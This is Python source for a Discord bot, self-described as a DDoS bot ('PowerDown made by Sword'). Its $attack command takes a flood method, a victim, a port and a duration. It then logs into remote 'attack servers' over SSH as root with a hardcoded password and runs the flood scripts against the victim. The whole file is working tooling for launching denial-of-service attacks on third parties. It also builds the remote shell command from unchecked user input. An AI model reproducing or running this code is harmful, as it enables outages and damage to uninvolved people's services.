import discord 
from discord.ext import commands
import paramiko
import time

bot = commands.Bot(command_prefix = "$", description = "PowerDown made by Sword")

l4methods = ['TCP', 'UDP', 'STD']   
l7methods = ['HTTP', 'CFB', 'OVH', 'BYPASS'] 

server = [["1.3.3.7", "22", "root", "OeDiCJwW9Ozvsq4zHLOB"]]

token = "Your Token"

def sshCommand(hostname, port, username, password, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port, username, password)
        stdin, stdout, stderr = client.exec_command(command)
        print("Attack server connected")
    except:
        print("Attack server no connected")
        pass

@bot.event
async def on_ready():
    activity = discord.Game(name="$showcommand", type=3)
    await bot.change_presence(status=discord.Status.idle, activity=activity)
    print("Bot connected !")

@bot.command()
async def attack(ctx, method : str = None, victim : str = None, port : str = None, times : str = None):
    if method == None:
        await ctx.send('You need a method !')
    elif method.upper() not in l4methods and method.upper() not in l7methods:
        await ctx.send('Invalid method !')
    elif victim == None:
        await ctx.send('You need a target !')
    elif port == None:
        await ctx.send('You need a port !')
    elif times == None:
        await ctx.send('You need a time !')
    else:
        command = f'./{method} {victim} 10 {times} {port}'
        for x in range(len(server)):
            sshCommand(server[x][0], server[x][1], server[x][2], server[x][3], command)
        await ctx.send('Please wait 25 secondes for starting attack')
        time.sleep(20)
        await ctx.send('Attack succesfully lunched !')
        await ctx.send(f'Attack lunched on {victim}:{port} with {method} method, for {times} second !')

@bot.command()
async def methods(ctx):
    l4methodstr = ''
    l7methodstr = ''
    for m in l4methods:
        l4methodstr = f'{l4methodstr}{m}\n'
    for m2 in l7methods:
        l7methodstr = f'{l7methodstr}{m2}\n'
    embed = discord.Embed(title="Methods", description="Bot Discord DDOS made by Sword.")
    embed.add_field(name="Syntax :", value="$attack [method] [target] [port] [time]")
    embed.add_field(name="L4 METHODS :", value=f"{l4methodstr}")
    embed.add_field(name="L7 METHODS :", value=f"{l7methodstr}")
    await ctx.send(embed=embed)

@bot.command()
async def showcommand(ctx):
    embed = discord.Embed(title="Info : ", description="Bot Discord DDOS made by Sword.")
    embed.add_field(name="$methods :", value="Show different methods for attack")
    embed.add_field(name="$attack :", value="For attack, lunch ddos attack")
    embed.add_field(name="$status :", value="Show statut of attack server")
    await ctx.send(embed=embed)

@bot.command()
async def status(ctx):
    embed = discord.Embed(title="Status of attack server : ", description="Bot Discord DDOS made by Sword.")
    embed.add_field(name="1 / 3 servers", value=" ")
    await ctx.send(embed=embed)

bot.run(token)
